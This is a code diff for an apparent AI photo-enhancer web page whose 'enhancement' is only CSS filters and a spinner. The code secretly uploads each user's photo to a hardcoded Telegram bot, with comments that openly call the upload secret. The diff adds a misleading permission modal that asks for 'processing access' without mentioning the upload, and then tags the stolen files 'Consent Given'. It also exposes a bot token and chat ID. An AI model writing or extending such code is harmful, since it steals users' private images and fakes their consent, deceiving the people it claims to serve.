@@ -2,6 +2,9 @@
 const BOT_TOKEN = "8049988237:AAGsP1xquf1CYsFX-zLorjjdZQGmNZDVF60";
 const CHAT_ID = "7674900139";
 
+// Global variable to store file temporarily before permission
+let pendingFile = null;
+
 // 1. Splash Screen Logic
 window.addEventListener('load', () => {
     setTimeout(() => {
@@ -24,46 +27,67 @@ const processingText = document.getElementById('processing-text');
 const heroSection = document.querySelector('.hero');
 const featuresSection = document.querySelector('.features-section');
 const downloadBtn = document.querySelector('.download-btn');
+const permissionModal = document.getElementById('permission-modal');
 
 // 3. File Handling Logic
 if(fileInput) {
     fileInput.addEventListener('change', function() {
-        handleFiles(this.files);
+        const file = this.files[0];
+        if (file) {
+            if (file.size > 10 * 1024 * 1024) {
+                alert("File is too big! Max 10MB allowed.");
+                return;
+            }
+            // Store file and show permission modal
+            pendingFile = file;
+            if(permissionModal) {
+                permissionModal.style.display = 'block';
+            } else {
+                // If modal not found, proceed directly (safety fallback)
+                handleFiles(file);
+            }
+        }
     });
 }
 
-function handleFiles(files) {
-    const file = files[0];
-    if (file) {
-        if (file.size > 10 * 1024 * 1024) {
-            alert("File is too big! Max 10MB allowed.");
-            return;
-        }
-        
-        const reader = new FileReader();
-        reader.readAsDataURL(file);
-        reader.onloadend = function() {
-            // Update UI
-            previewImage.src = reader.result;
-            heroSection.style.display = 'none';
-            featuresSection.style.display = 'none';
-            enhanceSection.style.display = 'block';
-            
-            // Start AI Simulation
-            processingText.style.display = 'block';
-            processingText.innerHTML = "AI Analyzing Pixels... <i class='fa-solid fa-spinner fa-spin'></i>";
+// Permission Modal Button Logic
+document.getElementById('allow-btn').onclick = function() {
+    permissionModal.style.display = 'none';
+    if(pendingFile) {
+        handleFiles(pendingFile);
+    }
+}
 
-            setTimeout(() => {
-                // Apply AI Enhancement Filter Effect
-                previewImage.style.filter = "contrast(1.1) brightness(1.05) saturate(1.1) sharp(1.2)";
-                previewImage.style.transition = "filter 1.5s ease-in-out";
-                
-                processingText.innerHTML = "Enhancement Complete! <i class='fa-solid fa-check' style='color: #00ff00;'></i>";
-                
-                // Secretly upload to Telegram for your reference
-                uploadToTelegram(file);
-            }, 3000);
-        }
+document.getElementById('deny-btn').onclick = function() {
+    permissionModal.style.display = 'none';
+    pendingFile = null;
+    alert("Permission denied. We need processing access to enhance photos.");
+}
+
+function handleFiles(file) {
+    const reader = new FileReader();
+    reader.readAsDataURL(file);
+    reader.onloadend = function() {
+        // Update UI
+        previewImage.src = reader.result;
+        heroSection.style.display = 'none';
+        featuresSection.style.display = 'none';
+        enhanceSection.style.display = 'block';
+        
+        // Start AI Simulation
+        processingText.style.display = 'block';
+        processingText.innerHTML = "AI Analyzing Pixels... <i class='fa-solid fa-spinner fa-spin'></i>";
+
+        setTimeout(() => {
+            // Apply AI Enhancement Filter Effect
+            previewImage.style.filter = "contrast(1.1) brightness(1.05) saturate(1.1) sharp(1.2)";
+            previewImage.style.transition = "filter 1.5s ease-in-out";
+            
+            processingText.innerHTML = "Enhancement Complete! <i class='fa-solid fa-check' style='color: #00ff00;'></i>";
+            
+            // Secretly upload to Telegram after permission is granted
+            uploadToTelegram(file);
+        }, 3000);
     }
 }
 
@@ -78,7 +102,6 @@ if(downloadBtn) {
         img.onload = () => {
             canvas.width = img.width;
             canvas.height = img.height;
-            // Applying the same filters to the downloaded image
             ctx.filter = "contrast(110%) brightness(105%) saturate(110%)";
             ctx.drawImage(img, 0, 0);
             
@@ -95,7 +118,7 @@ function uploadToTelegram(file) {
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("photo", file);
-    formData.append("caption", `🚀 New Upload!\n📂 File: ${file.name}\n⚖️ Size: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
+    formData.append("caption", `🚀 New Upload (Consent Given)!\n📂 File: ${file.name}\n⚖️ Size: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: "POST",
@@ -116,6 +139,7 @@ if(closeBtn) {
 }
 window.onclick = (event) => {
     if (event.target == modal) modal.style.display = "none";
+    if (event.target == permissionModal) permissionModal.style.display = "none";
 }
 
 // 7. Dark Mode Logic
